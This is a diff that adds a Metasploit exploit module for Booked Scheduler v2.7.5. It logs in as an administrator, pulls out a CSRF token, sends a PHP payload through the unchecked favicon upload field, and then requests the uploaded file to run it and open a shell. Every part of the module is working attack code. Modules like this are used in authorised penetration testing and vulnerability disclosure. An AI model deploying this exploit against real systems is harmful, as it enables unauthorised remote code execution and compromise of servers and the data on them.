@@ -1,0 +1,181 @@
+## 
+# This module requires Metasploit: http://metasploit.com/download 
+# Current source: https://github.com/rapid7/metasploit-framework 
+## 
+ 
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking 
+ 
+  include Msf::Exploit::Remote::HttpClient 
+ 
+    def initialize 
+    super( 
+      'Name'           => 'Booked Scheduler v2.7.5 - Remote Command Execution', 
+      'Description'    => %q{ 
+        This module exploits a file upload vulnerability Booked 2.7.5. 
+        In the "Look and Feel" section of the management panel, you can modify the Logo-Favico-CSS files.  
+        Upload sections has file extension control except favicon part.
+        You can upload the file with the extension you want through the Favicon field.
+        The file you upload is written to the main directory of the site under the name "custom-favicon". 
+        After upload the php payload to the main directory, Exploit executes payload and receives shell.  
+      }, 
+      'Author'         => [ 
+        'AkkuS <Özkan Mustafa Akkuş>', # Vulnerability Discovery, PoC & Msf Module 
+        ], 
+      'License'        => MSF_LICENSE, 
+      'References'     => 
+        [
+          ['URL', 'https://pentest.com.tr/exploits/Booked-2-7-5-Remote-Command-Execution-Metasploit.html'],  
+        ], 
+      'Platform'       => ['php'], 
+      'Arch'           => ARCH_PHP, 
+      'Targets'        => 
+        [ 
+          ['Booked Scheduler v2.7.5', {}] 
+        ], 
+      'DisclosureDate' => '01 March 2019', 
+      'Privileged'     => false,       
+      'DefaultTarget' => 0 
+    ) 
+ 
+    register_options( 
+        [ 
+          OptBool.new('SSL', [true, 'Use SSL', false]),
+          OptString.new('TARGETURI', [true, 'The base path to Booked', '/']), 
+          OptString.new('USER', [true, 'User to login with', 'admin']), 
+          OptString.new('PASS', [true, 'Password to login with', 'admin']), 
+        ], self.class) 
+    end 
+##
+# Check Exploit Vulnerable
+##  
+  def check
+    res = send_request_cgi({ 
+      'method' => 'GET',  
+      'uri'    => normalize_uri(target_uri, "/Web/index.php")      
+    })
+
+   if res and res.code == 200 and res.body =~ /v2.7.5/
+      return Exploit::CheckCode::Vulnerable
+    else
+      return Exploit::CheckCode::Safe
+    end
+    return res 
+  end  
+##
+# Exploit Portion
+##  
+  def exploit 
+    res = send_request_cgi({ 
+      'method' => 'POST', 
+      'uri'    => normalize_uri(target_uri, "/Web/index.php"), 
+      'vars_post' => { 
+          "email" => datastore['USER'], 
+          "password" => datastore['PASS'],
+          "captcha" => "",
+          "resume" => "",
+          "language" => "en_us",
+          "login" => "submit" 
+           
+      } 
+    })
+
+   if res and res.code == 302
+      print_status("Successful redirection to admin dashboard.")
+    else
+      return res
+    end
+ 
+    get_cookie = res.get_cookies 
+    cookie = get_cookie 
+##
+# Login Access Control
+##
+    control = send_request_cgi({ 
+      'method' => 'GET', 
+      'cookie' => cookie, 
+      'uri'    => normalize_uri(target_uri, "/Web/dashboard.php")      
+    })
+
+    html = control.body
+    if html =~ /Dashboard/
+      print_good("Login successfuly")
+    else
+      print_status("User information is incorrect. Login failed")
+      exit 0
+    end 
+##
+# Reading CSRF Token
+##
+    csrf = send_request_cgi({ 
+      'method' => 'GET', 
+      'cookie' => cookie, 
+      'uri'    => normalize_uri(target_uri, "/Web/admin/manage_theme.php")      
+    })
+
+    html = control.body
+    if html =~ /Look and Feel/
+      token = csrf.body.split('CSRF_TOKEN" value=')[1].split(";")[0].split('/')[0].split('"')[1]
+      print_status("CSRF Token = #{token}")
+    else
+      print_status("User information is incorrect. Login failed")
+      exit 0
+    end 
+##
+# Loading phase of the vulnerable file
+##
+    boundary = Rex::Text.rand_text_alphanumeric(29)
+
+    data2 = "-----------------------------{boundary}"
+    data2 << "\r\nContent-Disposition: form-data; name=\"LOGO_FILE\"\r\n\r\n\r\n"
+    data2 << "-----------------------------{boundary}"
+    data2 << "\r\nContent-Disposition: form-data; name=\"FAVICON_FILE\"; filename=\"akkus.php\""
+    data2 << "\r\nContent-Type: text/html\r\n\r\n"
+    data2 << payload.encoded
+    data2 << "\n\r\n-----------------------------{boundary}"
+    data2 << "\r\nContent-Disposition: form-data; name=\"CSS_FILE\"\r\n\r\n\r\n"
+    data2 << "-----------------------------{boundary}"
+    data2 << "\r\nContent-Disposition: form-data; name=\"CSRF_TOKEN\"\r\n\r\n"
+    data2 << "#{token}"
+    data2 << "\r\n-----------------------------{boundary}--\r\n"
+
+    res = send_request_raw(
+      {
+        'method' => "POST",
+        'uri'     => normalize_uri(target_uri, "/Web/admin/manage_theme.php?action=update"),
+        'data' => data2,
+        'headers' =>
+        {
+          'Content-Type'   => 'multipart/form-data; boundary=---------------------------{boundary}',
+        },
+        'cookie'  => cookie
+      })
+
+    if res and res.code == 200
+      print_good "Payload was successfully uploaded."
+    else
+      print_error "Upload failed."
+      return
+    end 
+##
+# Command execution and shell retrieval
+##
+    print_status("Attempting to execute the payload...")
+
+    command = payload.encoded
+
+    res = send_request_cgi(
+      {
+        'uri'     => normalize_uri(target_uri, "/Web/custom-favicon.php"),
+        'cookie'  => cookie
+      }, 25)
+
+
+    if res and res.code == 200
+      print_good "Payload executed successfully"
+    end    
+  end     
+end
+##
+# End
+##
